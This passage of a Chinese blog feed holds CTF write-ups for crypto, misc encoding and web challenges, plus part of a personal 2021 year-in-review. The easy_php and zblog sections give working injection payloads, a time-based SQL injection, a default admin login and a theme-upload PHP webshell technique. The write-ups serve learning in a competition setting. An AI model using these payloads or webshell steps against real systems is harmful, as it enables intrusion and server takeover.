json.dumps(data)</span><br><span class="line">            self.qrencode(data)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checker</span>(<span class="params">self , data</span>):</span></span><br><span class="line">        data = json.loads(data.decode())</span><br><span class="line">        delta_time = time.time() - data[<span class="string">&#x27;time&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> delta_time &lt; <span class="number">0</span> <span class="keyword">or</span> delta_time &gt; <span class="number">30</span>:</span><br><span class="line">            self._send(<span class="string">b&#x27;this health code has been overdue&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;isRed&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">            self._send(<span class="string">b&#x27;No! your health code is red!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        self._send(<span class="string">&#x27;hi &#x27;</span>+data[<span class="string">&#x27;name&#x27;</span>]+<span class="string">&#x27; your health code is green and you are healthy.&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;name&#x27;</span>] == <span class="string">&#x27;alice&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.alarm(<span class="number">120</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            self._send(menu)</span><br><span class="line">            choice = <span class="built_in">int</span>(self._recv())</span><br><span class="line">            <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">                self._send(<span class="string">b&#x27;who are you&#x27;</span>)</span><br><span class="line">                name = self._recv()</span><br><span class="line">                self.send_hcode(name.decode())</span><br><span class="line">            <span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">                self._send(<span class="string">b&#x27;size:&#x27;</span>)</span><br><span class="line">                size = <span class="built_in">int</span>(self._recv()) <span class="comment"># the height or the width of the qrcode</span></span><br><span class="line">                self._send(<span class="string">b&#x27;your health code(in base64):&#x27;</span>)</span><br><span class="line">                qr = self._recv()</span><br><span class="line">                data = self.qrdecode(qr , (size,size))</span><br><span class="line">                <span class="keyword">if</span> self.checker(data) == <span class="number">1</span>:</span><br><span class="line">                    self._send(flag)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self._send(<span class="string">b&#x27;wrong!&#x27;</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>这里只粘贴了中间的重要代码，通过下载相应的包，然后理清楚逻辑就可以<code>nc</code>回答出问题得到<code>flag</code></p><p>这里特别的友好，给出了<code>QR</code>的生成代码，通过审计，大概意思是要让我们生成<code>QR</code>使得<code>alice</code>同学的健康码不为红色，我们通过加密算法，在生成图片时输出图片尺寸得知<code>size=31</code>，最后<code>nc</code>得到了<code>flag</code>，这里生成的健康码需要在30秒内提交，否则就失效了哦！</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> qrcode</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pyzbar.pyzbar <span class="keyword">as</span> pyzbar</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">database = &#123;<span class="string">&#x27;alice&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qrencode</span>(<span class="params">data</span>):</span></span><br><span class="line">    qr = qrcode.QRCode(error_correction=qrcode.ERROR_CORRECT_L,</span><br><span class="line">                       border=<span class="number">1</span>,</span><br><span class="line">                       box_size=<span class="number">1</span>)</span><br><span class="line">    qr.add_data(data)</span><br><span class="line">    qr.make(fit=<span class="literal">True</span>)</span><br><span class="line">    img = qr.make_image()</span><br><span class="line">    <span class="built_in">print</span>(img.size)</span><br><span class="line">    <span class="keyword">return</span> b64encode(img.tobytes())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_hcode</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> database:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;this one is not in the database&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>: name,</span><br><span class="line">            <span class="string">&#x27;time&#x27;</span>: <span class="built_in">int</span>(time.time()),</span><br><span class="line">            <span class="string">&#x27;isRed&#x27;</span>: database[name]</span><br><span class="line">        &#125;</span><br><span class="line">        data = json.dumps(data)</span><br><span class="line">        <span class="keyword">return</span> qrencode(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;alice&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(send_hcode(name))</span><br></pre></td></tr></table></figure><h2 id="做个核酸签个到"><a href="#做个核酸签个到" class="headerlink" title="做个核酸签个到"></a>做个核酸签个到</h2><p>我的密码是真的差啊，这里的位运算是通过<code>离散数学</code>里的<code>并集</code>和<code>交集</code>求的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">tmp = getRandomNBitInteger(<span class="number">142</span>)</span><br><span class="line">a = flag | tmp</span><br><span class="line">b = flag &amp; tmp</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;OUTPUT</span></span><br><span class="line"><span class="string">4475588893486760807434877361949655702156202</span></span><br><span class="line"><span class="string">10403436853134845129656953606837707260539903</span></span><br><span class="line"><span class="string">2994485173442830774576326061629704337957160</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这里拿一个图来形容一下</p><p><img src="/post/2022-01/%E8%A5%BF%E7%94%B5%E6%8A%97%E7%96%ABCTF(%E4%B8%AA%E4%BA%BA%E8%B5%9B)/202201042128951.png" alt="task"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">tmp=<span class="number">4475588893486760807434877361949655702156202</span></span><br><span class="line">a=<span class="number">10403436853134845129656953606837707260539903</span></span><br><span class="line">b=<span class="number">2994485173442830774576326061629704337957160</span></span><br><span class="line">flag = (a-tmp)|b</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="佛说"><a href="#佛说" class="headerlink" title="佛说"></a>佛说</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">哆是恐礙怯心集曳哆瑟切侄。諳夜俱滅怯吉明呐恐摩缽涅罰夷想罰亦怯耨侄呼礙等梵三諳切缽大侄呼世諳亦醯哆世集數吉即爍大缽故俱羅缽若缽利訶奢菩梵利真姪哆藐勝</span><br></pre></td></tr></table></figure><p>在前面加个<code>佛曰：</code>到<a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅</a>上解密即可</p><h2 id="戴上口罩"><a href="#戴上口罩" class="headerlink" title="戴上口罩"></a>戴上口罩</h2><p>口罩图片下有个文本框，里面就是<code>flag</code></p><h2 id="打不开的压缩包"><a href="#打不开的压缩包" class="headerlink" title="打不开的压缩包"></a>打不开的压缩包</h2><p><code>zip</code>伪加密</p><p>使用<code>ZipCenOp.jar</code>直接解密，或者也可以通过<code>Winhex</code>等工具进行修改解密</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ZipCenop.jar r xxx.zip</span><br></pre></td></tr></table></figure><p><code>ZipCenOp.jar</code> 百度网盘下载链接：<a href="https://pan.baidu.com/s/1RLRPN0fKWmqdaqLlV409Wg">https://pan.baidu.com/s/1RLRPN0fKWmqdaqLlV409Wg</a> 提取码：<code>twl4</code></p><h2 id="不一样的贝斯"><a href="#不一样的贝斯" class="headerlink" title="不一样的贝斯"></a>不一样的贝斯</h2><p>解密</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>B355754434E4442495A5858555A444E48455A4534565A564F4A53464B3342534D455A5655324353493532444356334A48465A47493233514F3551564D33435A4B5257584F4D4B554A4244455157544D4955345641554A3548553D3D3D3D3D3D</span><br><span class="line">==&gt;Hex解码</span><br><span class="line">K5WTCNDBIZXXUZDNHEZE4VZVOJSFK3BSMEZVU2CSI52DCV3JHFZGI23QO5QVM3CZKRWXOMKUJBDEQWTMIU4VAUJ5HU======</span><br><span class="line">==&gt;base32解码</span><br><span class="line">Wm14aFozdm92NW5rdUl2a3ZhRGt1Wi9rdkpwaVlYTmw1THFHZlE9PQ==</span><br><span class="line">==&gt;base64两次解码</span><br><span class="line">flag&#123;这下你也会base了&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> Ctfer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BMZCTF</title>
      <link href="/post/2022-01/BMZCTF/"/>
      <url>/post/2022-01/BMZCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><p>审计源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_addslashes</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(!is_array(<span class="variable">$string</span>)) <span class="keyword">return</span> addslashes(<span class="variable">$string</span>);</span><br><span class="line">     <span class="keyword">foreach</span>(<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) <span class="variable">$string</span>[<span class="variable">$key</span>] = new_addslashes(<span class="variable">$val</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc()) &#123;</span><br><span class="line">    <span class="variable">$_POST</span> = new_addslashes(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="variable">$_GET</span> = new_addslashes(<span class="variable">$_GET</span>);</span><br><span class="line">    <span class="variable">$_REQUEST</span> = new_addslashes(<span class="variable">$_REQUEST</span>);</span><br><span class="line">    <span class="variable">$_COOKIE</span> = new_addslashes(<span class="variable">$_COOKIE</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sudo&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="keyword">__DIR__</span> .<span class="string">&#x27;/config.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">require</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;info&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$LANG</span>[<span class="variable">$key</span>])) &#123;</span><br><span class="line">        <span class="variable">$content</span> = file_get_contents(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$content</span> = substr(<span class="variable">$content</span>,<span class="number">0</span>,-<span class="number">3</span>);</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$content</span>.<span class="string">&quot;\n\$LANG[&#x27;<span class="subst">$key</span>&#x27;] = &#x27;<span class="subst">$_POST</span>[no1]&#x27;;\n?&gt;&quot;</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$file</span>,<span class="variable">$data</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$LANG</span>[<span class="variable">$key</span>]) &amp;&amp; <span class="variable">$LANG</span>[<span class="variable">$key</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;no1&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$content</span> = file_get_contents(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$content</span> = str_replace(<span class="variable">$LANG</span>[<span class="variable">$key</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;no1&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">        file_put_contents(<span class="variable">$file</span>,<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;re&#x27;</span>]))&#123;</span><br><span class="line">    file_put_contents(<span class="string">&quot;./config.php&quot;</span>,base64_decode(<span class="string">&quot;PD9waHAKJExBTkdbJ21lbWJlcl9tYW5hZ2UnXSA9ICdhZG1pbic7Cj8+Cg==&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里发现可以修改<code>config.php</code>文件，并且还可以访问的到，所以我们就想到利用<code>php代码拼接</code>注入恶意代码，但是这里有函数<code>addslashes()</code>函数限制了注入，我们需要想办法绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addslashes(<span class="keyword">string</span> <span class="variable">$str</span>): <span class="keyword">string</span></span><br><span class="line">返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（<span class="string">&#x27;）、双引号（&quot;）、反斜线（\）与 NUL（null 字符）。</span></span><br></pre></td></tr></table></figure><p>可以在本地测试，观察<code>config.php</code>文件的修改，</p><p>这里出现的漏洞点是第<code>27</code>行的<code>$content = str_replace($LANG[$key],$_POST[&#39;no1&#39;],$content);</code></p><p>通过多次测试我发现了以下的绕过方法，这里我就不细说了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post:</span><br><span class="line">sudo=1&amp;info[name]=b&amp;no1=\</span><br><span class="line">sudo=1&amp;info[name]=a&amp;no1=&#x27;;phpinfo();#</span><br><span class="line">sudo=1&amp;info[name]=b&amp;no1=\</span><br></pre></td></tr></table></figure><p><code>config.php</code>变化如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$LANG</span>[<span class="string">&#x27;member_manage&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$LANG</span>[<span class="string">&#x27;b&#x27;</span>] = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$LANG</span>[<span class="string">&#x27;member_manage&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$LANG</span>[<span class="string">&#x27;b&#x27;</span>] = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line"><span class="variable">$LANG</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="string">&#x27;\&#x27;;phpinfo();#&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$LANG</span>[<span class="string">&#x27;member_manage&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$LANG</span>[<span class="string">&#x27;b&#x27;</span>] = <span class="string">&#x27;\\\\&#x27;</span>;</span><br><span class="line"><span class="variable">$LANG</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="string">&#x27;\\&#x27;</span>;phpinfo();<span class="comment">#&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这样就成功逃逸执行了<code>phpinfo()</code>，然后只需要将<code>&#39;;phpinfo();#</code>替换为<code>&#39;;eval($_POST[a]);#</code>即可<code>getshell</code>了</p><h2 id="zblog-scshop"><a href="#zblog-scshop" class="headerlink" title="zblog-scshop"></a>zblog-scshop</h2><p>是个<code>CMS</code>，尝试了下<code>web.zip</code>，发现存在源码泄露，是<code>Scshop1.5</code>，通过网上查找，可以发现在<code>/Core/Program/Ant_Contrl.php</code>可能存在<code>sql注入</code></p><p><img src="/post/2022-01/BMZCTF/202201012040384.png" alt="image-20220101174005989"></p><p>在这个<code>GetIp()</code>函数中，没有进行严格的过滤发现ip可控并且没有过滤，查看哪里调用了这个函数</p><p><img src="/post/2022-01/BMZCTF/202201012040598.png" alt="image-20220101174132315"></p><p>我们随便找一个，去<code>Ant_Fc.php</code>里边看一下</p><p><img src="/post/2022-01/BMZCTF/202201012041728.png" alt="image-20220101174214316"></p><p>这里的<code>$val</code>进行了拼接，直觉告诉我这很有可能是利用点，接着看一下<code>AntAdd()</code>函数，类<code>WD_Data_Process()</code>是在<code>Ant_Class.php</code>中定义的，查看该文件</p><p><img src="/post/2022-01/BMZCTF/202201012041093.png" alt="image-20220101174433737"></p><p>我们发现将刚才的值直接加入了<code>sql</code>语句进行执行，我们可以构造如下payload进行验证</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span>  $<span class="keyword">table</span> ($field) <span class="keyword">VALUES</span> (<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;&#x27;</span><span class="keyword">or</span> sleep(<span class="number">3</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>);</span><br></pre></td></tr></table></figure><p>我们通过搜索<code>Search_Data</code>来查找哪里调用了这个函数，发现在<code>/Template/Default/File/search.php</code></p><p><img src="/post/2022-01/BMZCTF/202201012041937.png" alt="image-20220101174929007"></p><p>需要使得<code>$_POST[&#39;search&#39;]=1</code></p><p><img src="/post/2022-01/BMZCTF/202201012041925.png" alt="image-20220101175443757"></p><p>接下来就可以只需要编写脚本进行盲注，但是不知道为什么爆出来了<code>database()</code>，其他的什么都没出来…</p><p>赛后和师傅们交流了一下，说是拿<code>sqlmap</code>可以跑出来，更有师傅说根本不用爆破…emmm，直接在评论区直接找到了<code>zblog</code>的用户名，密码是默认密码，直接登录了<code>zblog</code>的后台。</p><p><img src="/post/2022-01/BMZCTF/202201012041776.jpg" alt="img"></p><p>账号密码为：<code>WHTadmin/admin888</code></p><p>然后通过主题文件的上传进行<code>getshell</code></p><p><img src="/post/2022-01/BMZCTF/202201012041069.png" alt="image-20220101200828921"></p><p>下载主题，然后在<code>vscode</code>中打开<code>.zba</code>文件，我这里找的是<code>comment.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;path&gt;HTML5CSS3/template/comment.php&lt;/path&gt;&lt;stream&gt;base64编码内容&lt;/stream&gt;</span><br></pre></td></tr></table></figure><p>将编码改为一句话木马的<code>base64</code>编码，然后再将主题上传上去，然后访问<code>/zblog/zb_users/theme/[主题名]/template/comment.php</code></p><p><img src="/post/2022-01/BMZCTF/202201012041656.png" alt="image-20220101201208222"></p><p>成功<code>getshell</code>后就可以获取<code>flag</code>了</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="do-you-know-it"><a href="#do-you-know-it" class="headerlink" title="do_you_know_it"></a>do_you_know_it</h2><p>附件：</p><p><img src="/post/2022-01/BMZCTF/202201012041476.png" alt="img"></p><p>查阅<a href="https://detexify.kirelabs.org/symbols.html">https://detexify.kirelabs.org/symbols.html</a></p><p>得flag{Play_with_LaTeX}</p><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">56465</span>a7757464977546d464e656b354b5632786b5346457862336c4f4d4842485632785a4d6c5a47556c46554d557057556a464e656c5a466146465756444135554651774f5642525054303d</span><br></pre></td></tr></table></figure><p>==&gt;十六进制转换</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VFZwWFIwTmFNek5KV2xkSFExb3lOMHBHV2xZMlZGUlFUMUpWUjFNelZFaFFWVDA5UFQwOVBRPT0</span><br></pre></td></tr></table></figure><p>==&gt;两次<code>base64decode</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MZWGCZ33IZWGCZ27JFZV6TTPORUGS3THPU======</span><br></pre></td></tr></table></figure><p>==&gt;一次<code>base32decode</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Flag_Is_Nothing&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> Ctfer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021年终总结</title>
      <link href="/post/2021-12/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
      <url>/post/2021-12/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>凌晨1点多在emo还没有睡觉，看到了<code>ABf1ag学长</code>的《年终总结》，情绪有所平复后我也想写一篇来激励自己，也可以回看自己这一年干了些啥。次日中午10点多起床做完核酸后，我翻了翻自己的相册，没想到不怎么拍照的我相册里还是有那么多值得纪念的事情。</p><h1 id="每月小结"><a href="#每月小结" class="headerlink" title="每月小结"></a>每月小结</h1><p>2021年算是我真正开始学习<code>安全</code>的一年，途中有过很多次坎坷和值得兴奋的事情。</p><h2 id="一月"><a href="#一月" class="headerlink" title="一月"></a>一月</h2><p>这个月我还在上大一的第一个学期，去年11月我进入了<code>网络科技协会</code>，开始接触到了<code>安全</code>，但是那时的我还没有很多的危机感，到现在都挺后悔没有利用好时间。</p><p>这个月中旬考过期末考试后就放假了，顺利回家的我和高中的朋友们一起聚会，并看了看母校<code>榆林中学</code></p><p><img src="/post/2021-12/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/202112311411020.png" alt="image-20211231114125832"></p><h2 id="二月"><a href="#二月" class="headerlink" title="二月"></a>二月</h2><p>这个月是在寒假，在家慵懒的我总要抽出时间来完成协会的寒假任务，我印象最深刻的是我看<code>mooc</code>的课学会了<code>python爬虫</code>，这个月学习进度很慢，而且也没有切实感受到安全的魅力</p><p><img src="/post/2021-12/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/202112311412401.png" alt="image-20211231114655017"></p><h2 id="三月"><a href="#三月" class="headerlink" title="三月"></a>三月</h2><p>这个月没有找到照片，应该是没有什么重要的事情发生，这会大一第二学期刚刚开学，第一次上学校的实习课。</p><p>哦，想起来了，我记得当时因为去了旭日大酒店吃饭，被通知是密切接触者，实习第二周的时候去了西邮宾馆隔离一周，当时拍的照片好像删掉了，我记得当时和我隔离的是一个大四的学长，最后考研考上了西电，tql，当时被隔离整整玩了一周，可能也就是因为那一周，让我对玩没了什么感觉……emmm</p><h2 id="四月"><a href="#四月" class="headerlink" title="四月"></a>四月</h2><p>这个月的月底第一次去了高新园区，去了四叶草安全公司，当时是和特长班的学长学姐们一起去的，第一次去公司，没见识的我被震撼到了，重新燃起了我学习安全的小火苗。</p><p><img src="/post/2021-12/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/202112311412402.png" alt="image-20211231120322199"></p><p><img src="/post/2021-12/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/202112311420596.png" alt="image-20211231120107119"></p><h2 id="五月"><a href="#五月" class="headerlink" title="五月"></a>五月</h2><p>这个月发生的事情还挺多的，因为之前报名参加了一个信息安全竞赛，但是一直没有行动，和伙伴们在一晚上创造了奇迹，当时就我们一个大一的队伍，现在想想当时是真的又菜又尬，评委老师人很好，给了我们一个安慰奖。</p><p><img src="/post/2021-12/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/202112311412404.png" alt="image-20211231130600322"></p><p><img src="/post/2021-12/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/202112311421668.png" alt="image-20211231130613839"></p><p>之后学校的运动会要开始了，我还参加了运动会的开幕式，那场面…算是我上大学以来第一次近距离看到那么多的nv生23333，还以为可以在运动会上找到真爱，没想到运动会第二天以后都没啥人了….emmm</p><p><img src="/post/2021-12/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/202112311425946.png" alt="image-20211231130902481"></p><p>在之后，我们和学长们去了隔壁的陕西师范大学交流学习，不得不说陕师大是真的大，属实是把我震撼到了，而且她们那的nv生是真的多啊！（就是单纯说一下多而已</p><p><img src="/post/2021-12/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/202112311428811.png" alt="image-20211231131120730"></p><p>再然后，迎来了大学的第一次音乐节，其实我对音乐不是特别感兴趣的，我主要是对喜欢音乐的人感兴趣吧可能，挺热闹的，碰碰运气嘛</p><p><img src="/post/2021-12/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/202112311428514.png" alt="image-20211231131307961"></p><h2 id="六月"><a href="#六月" class="headerlink" 